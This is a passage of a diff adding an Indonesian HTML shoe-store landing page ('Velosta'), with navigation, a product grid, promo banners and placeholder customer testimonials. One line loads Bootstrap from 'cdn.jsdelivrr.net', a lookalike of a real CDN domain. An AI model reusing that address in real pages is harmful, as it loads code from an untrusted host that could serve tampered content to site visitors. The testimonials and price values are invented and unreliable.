@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Velosta - Belanja Tiap Hari</title>
+
+  <link rel="stylesheet" href="style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@300;400;500;600;700&family=Roboto:wght@400;500;700&display=swap"
+    rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  <link rel="preload" href="./assets/images/hero-banner.png" as="image">
+  <link rel="icon" href="images/logoaja.png" type="image/x-icon">
+  <link href="https://cdn.jsdelivrr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+
+</head>
+
+<body id="top">
+
+    
+    <!-- header navbar -->
+
+    <header class="header" id="header1" data-header>
+        <div class="container">
+    
+          <div class="overlay" data-overlay></div>
+    
+          <a href="#" class="logo">
+            <img src="./images/logo.png" width="250" height="50" alt="Footcap logo">
+          </a>
+    
+          <button class="nav-open-btn" data-nav-open-btn aria-label="Open Menu">
+            <ion-icon name="menu-outline"></ion-icon>
+          </button>
+    
+          <nav class="navbar" data-navbar>
+    
+            <button class="nav-close-btn" data-nav-close-btn aria-label="Close Menu">
+              <ion-icon name="close-outline"></ion-icon>
+            </button>
+
+    
+            <ul class="navbar-list">
+    
+              <li class="navbar-item">
+                <a href="#homelink" class="navbar-link">Beranda</a>
+              </li>
+    
+              <li class="navbar-item">
+                <a href="#aboutlink" class="navbar-link">Tentang</a>
+              </li>
+    
+              <li class="navbar-item">
+                <a href="#produklink" class="navbar-link">Produk</a>
+              </li>
+    
+              <li class="navbar-item">
+                <a href="#promolink" class="navbar-link">Promo</a>
+              </li>
+    
+              <li class="navbar-item">
+                <a href="#reviewlink" class="navbar-link">Review</a>
+              </li>
+    
+              <li class="navbar-item">
+                <a href="#footerlink" class="navbar-link">Kontak</a>
+              </li>
+    
+            </ul>
+    
+            <ul class="nav-action-list">
+    
+              <li>
+                <button class="nav-action-btn">
+                  <ion-icon name="search-outline" aria-hidden="true"></ion-icon>
+    
+                  <span class="nav-action-text">Cari</span>
+                </button>
+              </li>
+    
+              <li>
+                <a href="#" class="nav-action-btn">
+                  <ion-icon name="person-outline" aria-hidden="true"></ion-icon>
+    
+                  <span class="nav-action-text">Masuk / Daftar</span>
+                </a>
+              </li>
+    
+              <li>
+                <button class="nav-action-btn">
+                  <ion-icon name="heart-outline" aria-hidden="true"></ion-icon>
+    
+                  <span class="nav-action-text">Favorit</span>
+    
+                  <data class="nav-action-badge" value="5" aria-hidden="true">5</data>
+                </button>
+              </li>
+    
+              <li>
+                <button class="nav-action-btn">
+                  <ion-icon name="bag-outline" aria-hidden="true"></ion-icon>
+    
+                  <data class="nav-action-text" value="318.00">Nike <strong>Rp318.000</strong></data>
+    
+                  <data class="nav-action-badge" value="4" aria-hidden="true">4</data>
+                </button>
+              </li>
+    
+            </ul>
+    
+          </nav>
+    
+        </div>
+      </header>
+      <!-- hero -->
+      <div class="container-clr" id="homelink">
+        <div class="clr-one"></div>
+        <div class="clr-two"></div>
+        <!-- Elemen lainnya -->
+    </div>
+    
+      <section class="hero" >
+        <div class="clr-one"></div>
+    <div class="clr-two"></div>
+        <div class="hero-content">
+          <h1 id="herojudul">Gaya Terbaik<br>Untuk Setiap <span id="langkah">Langkah</span></h1>
+          <p id="penjelasanhero">Kami Hadir Untuk Memberikan Pilihan Sempurna <br> Yang Selalu Mengikuti Tren Dan Kebutuhanmu</p>
+          <button class="cta-button" id="orderhero">Pesan Sekarang</button>
+        </div>
+        <div class="hero-image">
+          <img src="sepatubagus.png" alt="Shoe Image">
+        </div>
+      </section >
+    
+<!-- About Us -->
+<div class="container-clr" id="aboutlink">
+  <div class="clr-one"></div>
+  <div class="clr-two"></div>
+  <!-- Elemen lainnya -->
+</div>
+<section class="about" >
+
+    <div class="about-content" >
+        <h1 id="aboutjudul">Tentang Kami</h1>
+        <p id="aboutpenjelasan">Kenapa Harus Belanja Sepatu Di Website Kami?</p>
+    </div>
+    <div class="section colletion">
+        <section class="section-collection">
+            <div class="container">
+    
+              <ul class="collection-list has-scrollbar">
+    
+                <li>
+                  <div class="collection-card" style="background-image: url('./images/coollection-1.png')">
+                    <h1 class="h4 card-title" style="color: white; font-size: 20px">Kuliatas Terbaik</h1>
+    
+                    <a href="#">
+                      <span id="isi1" style="color: white; font-size: 17px">Menyediakan sepatu dari bahan berkualitas tinggi</span>
+                    </a>
+                  </div>
+                </li>
+    
+                <li>
+                  <div class="collection-card" style="background-image: url('./images/collection-2.png')">
+                    <h3 class="h4 card-title"  style="color: white; font-size: 20px">Model Kekinian</h3>
+    
+                    <a href="#">
+                      <span id="isi1"  style="color: white; font-size: 17px">Mengikuti tren terbaru dalam dunia fashion sepatu</span>
+                    </a>
+                  </div>
+                </li>
+    
+                <li>
+                  <div class="collection-card" style="background-image: url('./images/collection-3.png')">
+                    <h3 class="h4 card-title"  style="color: white; font-size: 20px">Pelayanan Ramah</h3>
+    
+                    <a href="#" id="produklink">
+                      <span id="isi1"  style="color: white; font-size: 17px" > Pelayanan yang responsif & pengiriman cepat</span>
+                    </a>
+                  </div >
+                </li>
+    
+              </ul>
+    
+            </div>
+          </section>
+    </div>
+</section>
+
+<!-- 
+        - #PRODUCT
+      -->
+      <div class="container-clr" >
+        <div class="clr-one"></div>
+        <div class="clr-two"></div>
+        <!-- Elemen lainnya -->
+    </div>
+    
+      <section class="section-product">
+       
+        <div class="container" >
+
+          <h2 class="h2 section-title" style="color: white; font-size: 35px" >Produk Terlaris</h2>
+
+          <ul class="filter-list">
+
+            <li>
+              <button class="filter-btn  active" id="filter-all">All</button>
+            </li>
+
+            <li>
+              <button class="filter-btn" id="filter-nike">Nike</button>
+            </li>
+
+            <li>
+              <button class="filter-btn"  id="filter-adidas">Adidas</button>
+            </li>
+
+            <li>
+              <button class="filter-btn"  id="filter-puma">Puma</button>
+            </li>
+
+          </ul>
+
+          <ul class="product-list">
+
+            <li class="product-item" data-category="Nike">
+              <div class="product-card" tabindex="0">
+
+                <figure class="card-banner">
+                  <img src="./products/pr1.png" width="312" height="350" loading="lazy"
+                    alt="Running Sneaker Shoes" class="image-contain">
+
+                  <div class="card-badge">Baru</div>
+
+                  <ul class="card-action-list">
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-1">
+                        <ion-icon name="cart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-2">
+                        <ion-icon name="heart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-3">
+                        <ion-icon name="eye-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-4">
+                        <ion-icon name="repeat-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-4">Compare</div>
+                    </li>
+
+                  </ul>
+                </figure>
+
+                <div class="card-content" >
+                  <h3 class="h3 card-title" style="color: white; font-size: 25px"> 
+                    <a href="#">Nike Air Max</a>
+                  </h3>
+
+                  <data class="card-price" value="180.85" style="color: white; font-size: 18px">Rp1.900.000</data>
+                  <button class="buy-now" onclick="window.location.href='Nike/NikeAir.html'">Beli Sekarang</button>
+                </div>
+
+              </div>
+            </li>
+<!-- item 2 -->
+            <li class="product-item" data-category="Nike">
+              <div class="product-card" tabindex="0">
+
+                <figure class="card-banner">
+                  <img src="./products/pr2.png" width="312" height="350" loading="lazy"
+                    alt="Leather Mens Slipper" class="image-contain">
+
+                  <ul class="card-action-list">
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-1">
+                        <ion-icon name="cart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-2">
+                        <ion-icon name="heart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-3">
+                        <ion-icon name="eye-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-4">
+                        <ion-icon name="repeat-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-4">Compare</div>
+                    </li>
+
+                  </ul>
+                </figure>
+
+                <div class="card-content">
+                  <h3 class="h3 card-title" style="color: white; font-size: 25px">
+                    <a href="#">Nike Air Force</a>
+                  </h3>
+
+                  <data class="card-price" value="190.85" style="color: white; font-size: 18px">Rp21.000.000</data>
+                  <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+                </div>
+
+              </div>
+            </li>
+<!-- item 3 -->
+            <li class="product-item"  data-category="Nike">
+              <div class="product-card" tabindex="0">
+
+                <figure class="card-banner">
+                  <img src="./products/pr3.png" width="312" height="350" loading="lazy"
+                    alt="Simple Fabric Shoe" class="image-contain">
+
+                  <div class="card-badge">Baru</div>
+
+                  <ul class="card-action-list">
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-1">
+                        <ion-icon name="cart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-2">
+                        <ion-icon name="heart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-3">
+                        <ion-icon name="eye-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-4">
+                        <ion-icon name="repeat-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-4">Compare</div>
+                    </li>
+
+                  </ul>
+                </figure>
+
+                <div class="card-content">
+                  <h3 class="h3 card-title" style="color: white; font-size: 25px">
+                    <a href="#">Nike ZoomX</a>
+                  </h3>
+
+                  <data class="card-price" value="160.85" style="color: white; font-size: 18px">Rp5.200.000</data>
+                  <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+                </div>
+
+              </div>
+            </li>
+<!-- item 4 -->
+            <li class="product-item"  data-category="Nike">
+              <div class="product-card" tabindex="0">
+
+                <figure class="card-banner">
+                  <img src="./products/pr4.png" width="312" height="350" loading="lazy"
+                    alt="Air Jordan 7 Retro " class="image-contain">
+
+                  <div class="card-badge"> -25%</div>
+
+                  <ul class="card-action-list">
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-1">
+                        <ion-icon name="cart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-2">
+                        <ion-icon name="heart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-3">
+                        <ion-icon name="eye-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-4">
+                        <ion-icon name="repeat-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-4">Compare</div>
+                    </li>
+
+                  </ul>
+                </figure>
+
+                <div class="card-content">
+
+                  <h3 class="h3 card-title" style="color: white; font-size: 25px">
+                    <a href="#">Nike Vapor </a>
+                  </h3>
+
+                  <data class="card-price" style="color: white; font-size: 18px" value="170.85">Rp12.200.200 <del>Rp15.000.000</del></data>
+                  <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+                </div>
+
+              </div>
+            </li>
+<!-- item 5 -->
+            <li class="product-item"  data-category="Adidas">
+              <div class="product-card" tabindex="0">
+
+                <figure class="card-banner">
+                  <img src="./products/pr5.png" width="312" height="350" loading="lazy"
+                    alt="Nike Air Max 270 SE" class="image-contain">
+
+                  <div class="card-badge">Baru</div>
+
+                  <ul class="card-action-list">
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-1">
+                        <ion-icon name="cart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-2">
+                        <ion-icon name="heart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-3">
+                        <ion-icon name="eye-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-4">
+                        <ion-icon name="repeat-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-4">Compare</div>
+                    </li>
+
+                  </ul>
+                </figure>
+
+                <div class="card-content">
+
+                
+
+                  <h3 class="h3 card-title">
+                    <a href="#" style="color: white; font-size: 25px">Adidas Boost</a>
+                  </h3>
+
+                  <data class="card-price" style="color: white; font-size: 18px" value="120.85">Rp7.250.000</data>
+                  <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+                </div>
+
+              </div>
+            </li>
+<!-- item 6 -->
+            <li class="product-item"  data-category="Adidas">
+              <div class="product-card" tabindex="0">
+
+                <figure class="card-banner">
+                  <img src="./products/pr6.png" width="312" height="350" loading="lazy"
+                    alt="Adidas Sneakers Shoes" class="image-contain">
+
+                  <ul class="card-action-list">
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-1">
+                        <ion-icon name="cart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-2">
+                        <ion-icon name="heart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-3">
+                        <ion-icon name="eye-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-4">
+                        <ion-icon name="repeat-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-4">Compare</div>
+                    </li>
+
+                  </ul>
+                </figure>
+
+                <div class="card-content">
+
+                 
+                  <h3 class="h3 card-title">
+                    <a href="#" style="color: white; font-size: 25px">Adidas Sneakers</a>
+                  </h3>
+
+                  <data class="card-price" style="color: white; font-size: 18px" value="100.85">Rp52.000.000</data>
+
+                </div>
+                <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+              </div>
+            </li>
+<!-- item 7 -->
+            <li class="product-item" data-category="Adidas">
+              <div class="product-card" tabindex="0">
+
+                <figure class="card-banner">
+                  <img src="./products/pr7.png" width="312" height="350" loading="lazy"
+                    alt="Nike Basketball shoes" class="image-contain">
+
+                  <ul class="card-action-list">
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-1">
+                        <ion-icon name="cart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-2">
+                        <ion-icon name="heart-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-3">
+                        <ion-icon name="eye-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+                    </li>
+
+                    <li class="card-action-item">
+                      <button class="card-action-btn" aria-labelledby="card-label-4">
+                        <ion-icon name="repeat-outline"></ion-icon>
+                      </button>
+
+                      <div class="card-action-tooltip" id="card-label-4">Compare</div>
+                    </li>
+
+                  </ul>
+                </figure>
+
+                <div class="card-content">
+
+                
+
+                  <h3 class="h3 card-title">
+                    <a href="#" style="color: white; font-size: 25px">Adidas Adizero</a>
+                  </h3>
+
+                  <data class="card-price" style="color: white; font-size: 18px"value="120.85">Rp210.000.000</data>
+                  <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+                </div>
+
+              </div>
+            </li>
+<!-- item 8 -->
+<li class="product-item" data-category="Adidas" class="itemnya">
+  <div class="product-card" tabindex="0">
+
+    <figure class="card-banner">
+      <img src="./products/pr8.png" width="312" height="350" loading="lazy"
+        alt="Nike Basketball shoes" class="image-contain">
+
+      <ul class="card-action-list">
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-1">
+            <ion-icon name="cart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-2">
+            <ion-icon name="heart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-3">
+            <ion-icon name="eye-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-4">
+            <ion-icon name="repeat-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-4">Compare</div>
+        </li>
+
+      </ul>
+    </figure>
+
+    <div class="card-content">
+
+   
+
+      <h3 class="h3 card-title" style="color: white; font-size: 25px">
+        <a href="#">Adidas Swift</a>
+      </h3>
+
+      <data class="card-price" style="color: white; font-size: 18px" value="120.85">Rp1.250.000</data>
+      <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+    </div>
+
+  </div>
+</li>
+<!-- item 9 -->
+<li class="product-item" data-category="Puma">
+  <div class="product-card" tabindex="0">
+
+    <figure class="card-banner">
+      <img src="./products/pr9.png" width="500px" height="100px" loading="lazy"
+        alt="Nike Basketball shoes" class="image-contain">
+
+      <ul class="card-action-list">
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-1">
+            <ion-icon name="cart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-2">
+            <ion-icon name="heart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-3">
+            <ion-icon name="eye-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-4">
+            <ion-icon name="repeat-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-4">Compare</div>
+        </li>
+
+      </ul>
+    </figure>
+
+    <div class="card-content">
+
+    
+
+      <h3 class="h3 card-title">
+        <a href="#" style="color: white; font-size: 25px">Puma Ignite</a>
+      </h3>
+
+      <data class="card-price" style="color: white; font-size: 18px" value="120.85">Rp42.000.000</data>
+      <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+    </div>
+
+  </div>
+</li>
+<!-- item 10 -->
+<li class="product-item" data-category="Puma">
+  <div class="product-card" tabindex="0">
+
+    <figure class="card-banner">
+      <img src="./products/pr10.png" width="312" height="350" loading="lazy"
+        alt="Nike Basketball shoes" class="image-contain">
+
+      <ul class="card-action-list">
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-1">
+            <ion-icon name="cart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-2">
+            <ion-icon name="heart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-3">
+            <ion-icon name="eye-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-4">
+            <ion-icon name="repeat-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-4">Compare</div>
+        </li>
+
+      </ul>
+    </figure>
+
+    <div class="card-content">
+
+     
+
+      <h3 class="h3 card-title">
+        <a href="#" style="color: white; font-size: 25px">Puma Enzo</a>
+      </h3>
+
+      <data class="card-price" style="color: white; font-size: 18px"value="120.85">Rp3.500.000</data>
+      <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+    </div>
+
+  </div>
+</li>
+<!-- item 11 -->
+<li class="product-item" data-category="Puma">
+  <div class="product-card" tabindex="0">
+
+    <figure class="card-banner">
+      <img src="./products/pr11.png" width="312" height="350" loading="lazy"
+        alt="Nike Basketball shoes" class="image-contain">
+
+      <ul class="card-action-list">
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-1">
+            <ion-icon name="cart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-2">
+            <ion-icon name="heart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-3">
+            <ion-icon name="eye-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-4">
+            <ion-icon name="repeat-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-4">Compare</div>
+        </li>
+
+      </ul>
+    </figure>
+
+    <div class="card-content">
+
+
+      <h3 class="h3 card-title">
+        <a href="#" style="color: white; font-size: 25px">Puma Hybrid</a>
+      </h3>
+
+      <data class="card-price"style="color: white; font-size: 18px" value="120.85">Rp4.200.000</data>
+      <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+    </div>
+
+  </div>
+</li>
+<!-- item 12 -->
+<li class="product-item" data-category="Puma">
+  <div class="product-card" tabindex="0">
+
+    <figure class="card-banner">
+      <img src="./products/pr12.png" width="312" height="350" loading="lazy"
+        alt="Nike Basketball shoes" class="image-contain">
+
+      <ul class="card-action-list">
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-1">
+            <ion-icon name="cart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-1">Add to Cart</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-2">
+            <ion-icon name="heart-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-2">Add to Whishlist</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-3">
+            <ion-icon name="eye-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-3">Quick View</div>
+        </li>
+
+        <li class="card-action-item">
+          <button class="card-action-btn" aria-labelledby="card-label-4">
+            <ion-icon name="repeat-outline"></ion-icon>
+          </button>
+
+          <div class="card-action-tooltip" id="card-label-4">Compare</div>
+        </li>
+
+      </ul>
+    </figure>
+
+    <div class="card-content">
+
+    
+      <h3 class="h3 card-title">
+        <a href="#" style="color: white; font-size: 25px" id="promolink">Puma Cell</a>
+      </h3>
+
+      <data class="card-price" style="color: white; font-size: 18px"value="120.85">Rp13.500.000</data>
+      <button class="buy-now" onclick="window.location.href='checkout-page.html'">Beli Sekarang</button>
+
+    </div>
+
+  </div>
+</li>  
+          </ul>
+
+        </div>
+      </section>
+
+
+<!-- 
+        - #CTA
+      -->
+
+      <section class="section-cta" >
+        <div class="container">
+
+          <ul class="cta-list">
+
+            <li>
+              <div class="cta-card" style="background-image: url('./images/cta-1.png')">
+                <p class="card-subtitle">Adidas Shoes</p>
+
+                <h3 class="h2 card-title">Diskon Musim Panas Hingga 50%</h3>
+
+                <a href="#" class="btn btn-link">
+                  <span>Shop Now</span>
+
+                  <ion-icon name="arrow-forward-outline" aria-hidden="true"></ion-icon>
+                </a>
+              </div>
+            </li>
+
+            <li>
+              <div class="cta-card" style="background-image: url('./images/cta-2.png')">
+                <p class="card-subtitle">Nike Shoes</p>
+
+                <h3 class="h2 card-title">Tetap Sporty dengan Gaya Anda</h3>
+
+                <a href="#" class="btn btn-link">
+                  <span id="reviewlink">Shop Now</span>
+
+                  <ion-icon name="arrow-forward-outline" aria-hidden="true"></ion-icon>
+                </a>
+              </div>
+            </li>
+
+          </ul >
+
+        </div>
+      </section>
+
+<!-- Testimonial -->
+<section >
+<div class="section testimonials" >
+  <section class="section-testimonials">
+    <div class="container">
+      <h2 class="h2 section-title" style="color: white !important; font-size: 30px;">Apa Kata Pelanggan Kami</h2>
+      <ul class="testimonials-list has-scrollbar">
+        <!-- Testimonial 1 -->
+        <li>
+          <div class="testimonial-card">
+            <img src="images/customer-1.jpg" alt="Thor John" class="customer-image">
+            <h3 class="h4 card-title" style="color: blue;">Thor John</h3>
+            <p class="testimonial-text">Saya menemukan situs web sepatu ini dan memutuskan untuk mencobanya. Wah, saya terkesan! Kualitas sepatu melebihi ekspektasi saya, dan layanan pelanggannya luar biasa. Saya pasti akan menjadi pelanggan tetap!</p>
+            <div class="stars">★★★★★</div>
+          </div>
+        </li>
+        <!-- Testimonial 2 -->
+        <li>
+          <div class="testimonial-card">
+            <img src="images/customer-2.jpg" alt="John Wick" class="customer-image">
+            <h3 class="h4 card-title" style="color: blue;">John Wick</h3>
+            <p class="testimonial-text">Saya telah mencari sepasang sepatu yang sempurna selama berbulan-bulan, dan akhirnya saya menemukannya di situs web ini. Tidak hanya bergaya dan nyaman, tetapi proses pemesanannya pun lancar.</p>
+            <div class="stars">★★★★★</div>
+          </div>
+        </li>
+        <!-- Testimonial 3 -->
+        <li>
+          <div class="testimonial-card">
+            <img src="images/customer-3.jpg" alt="James Jackie" class="customer-image">
+            <h3 class="h4 card-title" style="color: blue !important;">James Jackie</h3>
+            <p class="testimonial-text">Saya bukan orang yang sering memberikan ulasan, tetapi saya harus melakukannya untuk situs web ini. Variasi sepatu yang tersedia sangat banyak, dan harganya tidak ada duanya. Ditambah lagi, sepatu yang saya pesan tiba dalam kondisi bersih dan pas.</p>
+            <div class="stars">★★★★★</div>
+          </div>
+        </li>
+      </ul>
+    </div>
+  </section>
+</div>
+</section>
+
+
+<!-- 
+        - #INSTA POST
+      -->
+
+      <section class="section insta-post">
+
+        <ul class="insta-post-list has-scrollbar">
+
+          <li class="insta-post-item">
+            <img src="./images/insta-1.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+          <li class="insta-post-item">
+            <img src="./images/insta-2.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+          <li class="insta-post-item">
+            <img src="./images/insta-3.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+          <li class="insta-post-item">
+            <img src="./images/insta-4.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
